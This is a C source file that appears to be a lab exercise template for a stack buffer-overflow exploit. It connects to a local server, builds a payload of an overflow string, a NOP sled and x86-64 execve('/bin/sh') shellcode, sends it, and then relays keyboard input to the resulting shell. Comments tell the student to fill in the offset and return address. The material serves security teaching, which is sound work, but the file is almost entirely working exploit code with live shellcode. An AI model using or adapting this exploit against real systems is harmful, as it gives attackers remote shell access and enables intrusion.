#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <sys/select.h>
#include <sys/time.h>

int connectserver(char* address, int port); // connect the server
void exploitserver(int clsck); // exploit the server
void talktoserver(int clsck); // talk to the server

int main(int argc, char** argv) {
  int clsck;
  // !!! Change the address and port to the destination server !!!
  clsck=connectserver("127.0.0.1", 30000);
  if (clsck<0) return 1;

  exploitserver(clsck);

  talktoserver(clsck);
  
  // close the client socket
  close(clsck);
  return 0;
}

int connectserver(char* address, int port) {
  // create a client socket
  int clsck=socket(PF_INET,SOCK_STREAM,0);
  if (clsck<0) { printf("socket open fail.\n"); return(-1); }

  // set the server's address
  struct sockaddr_in svaddr;
  svaddr.sin_family=AF_INET;
  inet_aton(address, &svaddr.sin_addr);
  svaddr.sin_port=htons(port);

  // connect to the server
  if (connect(clsck,(struct sockaddr *)&svaddr,sizeof(struct sockaddr_in))<0) { printf("cannot connect server.\n"); return(-1); }

  return clsck;
}

void exploitserver(int clsck) {
  // prepare the exploiting packet

  // !!! Use the Makefile provided in the package to compile tcph. !!!
  // !!! Debug the tcph program. !!!
  // !!! First, count the number of bytes between buf and the returen address of the foo function. !!!
  // !!! Second, figure out the return address based on RBP. !!!
  // !!! Now, change the overflow string with proper format and values. !!!
  char overflow[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x01\x02\x03\x04\x05\x06\x07\x08\x01\x02\x03\x04\x05\x06\x07\x08\x00\x00\x00\x00\x00\x00\x00\x00";
  int ofsize = strlen(overflow) + 8; // be sure to set ofsize to the size of the overflow string here.

  // !!! no need to modify anything below. !!!
  // get the shell code string
  char shellcode[] = "\xeb\x0e\x5f\x48\x31\xc0\x48\x89\xc6\x48\x89\xc2\xb0\x3b\x0f\x05\x48\x31\xc0\x48\x89\xc7\xb0\x69\x0f\x05\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
  int scsize = strlen(shellcode);
  // make the padding
  int paddinglen=128;
  int size = ofsize + scsize + paddinglen;

  char* exploit = malloc(size + 1);
  int i;
  for (i = 0; i < size; i++) exploit[i] = '\x0';
  exploit[size] = '\x0';
  // get the exploiting string
  strncpy(exploit, overflow, ofsize); // overflow
  for (i = ofsize; i < ofsize + paddinglen; i++) exploit[i] = '\x90'; // padding
  strncpy(exploit + ofsize + paddinglen, shellcode, scsize); // shellcode
  FILE* fp = fopen("bad.dat","w");
  for (i = 0; i < size + 1; i++) fprintf(fp, "%c", exploit[i]);
  fclose(fp);

  // attack the server
  write(clsck, exploit, size);
  free(exploit);
}

void talktoserver(int clsck) {
  // send message to the server
  // "exit" to quit
  int status=1;  
  char buf[256];
  int len;
  while (status) {
    len=read(0, buf, 256);
    send(clsck, buf, len, 0);
    while((len=recv(clsck, buf, 256, MSG_DONTWAIT))>0) write(1, buf, len);
    if (strncmp(buf,"exit\n",5)==0) status=0;
  }
}

